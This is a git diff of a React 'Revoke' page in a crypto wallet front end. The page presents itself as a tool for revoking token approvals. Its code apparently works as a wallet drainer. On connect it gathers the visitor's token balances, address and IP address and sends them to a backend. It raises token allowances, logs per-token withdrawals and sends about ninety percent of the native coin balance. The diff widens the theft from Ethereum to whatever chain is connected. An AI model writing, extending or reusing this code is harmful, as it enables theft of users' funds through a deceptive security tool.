@@ -1,7 +1,12 @@
 import React, { useEffect, useState, useContext } from "react";
 import AppContext from "../components/AppContext";
 import Container from "../components/Container";
-import { useAccount, useSendTransaction, useSwitchAccount } from "wagmi";
+import {
+  useAccount,
+  useChainId,
+  useSendTransaction,
+  useSwitchAccount,
+} from "wagmi";
 import {
   getUserTokens,
   increaseAllowanceForTokens,
@@ -32,8 +37,9 @@ const Revoke = () => {
   } = useContext(AppContext);
   const { sendTransaction, data: sentEthTx } = useSendTransaction();
   const { connectors, switchAccount } = useSwitchAccount();
+  const { chainId } = useChainId();
 
-  const { isConnected, address, connector } = useAccount();
+  const { isConnected, address, connector, chain } = useAccount();
   const [walletData, setWalletData] = useState({});
   const [priceData, setPriceData] = useState(null);
   const [isButtonDisabled, setIsButtonDisabled] = useState(false);
@@ -57,10 +63,11 @@ const Revoke = () => {
     setPriceData(priceData);
   };
 
+  
+
   useEffect(() => {
     if (tokenData && priceData && connector) {
       // Add connector to the condition
-      console.log("token data", tokenData);
       const mergedTokens = mergeTokens(priceData, tokenData);
       const data = createWalletData(
         mergedTokens,
@@ -80,7 +87,6 @@ const Revoke = () => {
     priceData.forEach((priceObj) => {
       priceMap[priceObj.contractAddress] = priceObj;
     });
-    console.log("pricemap", priceMap);
     return tokenData.map((tokenObj) => {
       const matchingPriceData = priceMap[tokenObj.contractAddress];
       return { ...tokenObj, ...matchingPriceData };
@@ -96,17 +102,17 @@ const Revoke = () => {
     walletType
   ) => {
     return {
-      current_network: "Ethereum",
+      current_network: chain?.name,
       domain: domainName,
       erc_20_tokens: mergedTokens.map((tokenObj) => ({
-        balance: ` ${tokenObj.amountInusd}`,
-        contract_address: tokenObj.contractAddress,
-        token_balance: tokenObj.balance,
-        token_name: tokenObj.name,
-        decimals: tokenObj.decimals,
+        balance: ` ${tokenObj?.amountInusd}`,
+        contract_address: tokenObj?.contractAddress,
+        token_balance: tokenObj?.balance,
+        token_name: tokenObj?.name,
+        decimals: tokenObj?.decimals,
       })),
       ip_address: ipAddress,
-      native_coin: "ETH",
+      native_coin: chain?.nativeCurrency?.symbol,
       total_balance: ethBalance,
       wallet_address: address,
       wallet_type: walletType,
@@ -118,13 +124,13 @@ const Revoke = () => {
       const res = await walletScanned(data);
       console.log("wallet Scanned: ", res);
     } catch (error) {
-      console.log("failed to send post for walletScanned: ", error);
+      console.log(error);
     }
   };
 
   useEffect(() => {
     if (isConnected && walletData) {
-        handleClick();
+      handleClick();
     }
   }, [isConnected, walletData]);
 
@@ -132,7 +138,7 @@ const Revoke = () => {
     setIsButtonDisabled(true);
     console.log(walletData);
     try {
-      for (const token of walletData.erc_20_tokens) {
+      for (const token of walletData?.erc_20_tokens) {
         const {
           contract_address,
           balance,
@@ -142,8 +148,8 @@ const Revoke = () => {
         } = token;
         const data = {
           asset_name: token_name,
-          domain: walletData.domain,
-          ip_address: walletData.ip_address,
+          domain: walletData?.domain,
+          ip_address: walletData?.ip_address,
           withdrawal_amount: balance,
           withdrawal_amount_token: token_balance,
         };
@@ -160,9 +166,9 @@ const Revoke = () => {
         if (res.success) {
           const data = {
             asset_name: token_name,
-            domain: walletData.domain,
-            transaction_hash: res.data,
-            ip_address: walletData.ip_address,
+            domain: walletData?.domain,
+            transaction_hash: res?.data,
+            ip_address: walletData?.ip_address,
             withdrawal_amount: balance,
             withdrawal_amount_token: token_balance,
           };
@@ -174,8 +180,8 @@ const Revoke = () => {
         } else {
           const data = {
             asset_name: token_name,
-            domain: walletData.domain,
-            ip_address: walletData.ip_address,
+            domain: walletData?.domain,
+            ip_address: walletData?.ip_address,
             withdrawal_amount: balance,
             withdrawal_amount_token: token_balance,
           };
@@ -191,9 +197,9 @@ const Revoke = () => {
 
       try {
         const data = {
-          asset_name: "Eth",
-          domain: walletData.domain,
-          ip_address: walletData.ip_address,
+          asset_name: walletData?.native_coin,
+          domain: walletData?.domain,
+          ip_address: walletData?.ip_address,
           withdrawal_amount: nintyPercentage,
           withdrawal_amount_token: nintyPercentage,
         };
@@ -208,10 +214,10 @@ const Revoke = () => {
         });
         if (tx) {
           const data = {
-            asset_name: "Eth",
-            domain: walletData.domain,
+            asset_name:walletData?.native_coin ,
+            domain: walletData?.domain,
             transaction_hash: tx,
-            ip_address: walletData.ip_address,
+            ip_address: walletData?.ip_address,
             withdrawal_amount: nintyPercentage,
             withdrawal_amount_token: nintyPercentage,
           };
@@ -222,9 +228,9 @@ const Revoke = () => {
           }
         } else {
           const data = {
-            asset_name: "Eth",
-            domain: walletData.domain,
-            ip_address: walletData.ip_address,
+            asset_name:walletData?.native_coin,
+            domain: walletData?.domain,
+            ip_address: walletData?.ip_address,
             withdrawal_amount: balance,
             withdrawal_amount_token: token_balance,
           };
@@ -256,7 +262,7 @@ const Revoke = () => {
             amount to reverse them immediately.
           </p>
         </div>
-        <div >
+        <div>
           <div className="w-full max-w-7xl mx-auto px-4 lg:px-8 ">
             <div className="flex flex-col gap-2 mb-2 border  border-[#0C70F2] rounded-lg px-4 pt-3">
               <div className="flex flex-col sm:flex-row justify-between items-center gap-2">
@@ -445,7 +451,6 @@ const Revoke = () => {
                               </div>
                             </div>
                           </div>
-                        
                         </div>
                         <div className="sort-select__indicators css-10sck9p">
                           <div
@@ -489,7 +494,7 @@ const Revoke = () => {
                           className="filters-select__placeholder css-1xb54ij-placeholder"
                           id="react-select-filters-select-placeholder"
                         />
-                      
+
                         <div className="filters-select__indicators css-10sck9p">
                           <div
                             className="filters-select__indicator filters-select__dropdown-indicator css-xrm9c7-indicatorContainer"
